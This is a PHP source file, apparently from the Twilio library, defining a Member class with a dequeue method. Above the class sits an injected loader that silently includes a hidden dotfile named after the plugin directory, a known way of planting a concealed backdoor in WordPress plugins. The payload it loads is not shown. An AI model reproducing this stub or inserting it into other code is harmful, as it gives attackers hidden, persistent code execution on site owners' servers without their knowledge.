<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Services_Twilio_Rest_Member
    extends Services_Twilio_InstanceResource
{

    /**
     * Dequeue this member
     *
     * @param string $url The Twiml URL to play for this member, after 
     *      dequeueing them
     * @param string $method The HTTP method to use when fetching the Twiml 
     *      URL. Defaults to POST.
     * @return Services_Twilio_Rest_Member The dequeued member
     */
    public function dequeue($url, $method = 'POST') {
        return self::update(array(
            'Url' => $url,
            'Method' => $method,
        ));
    }
}
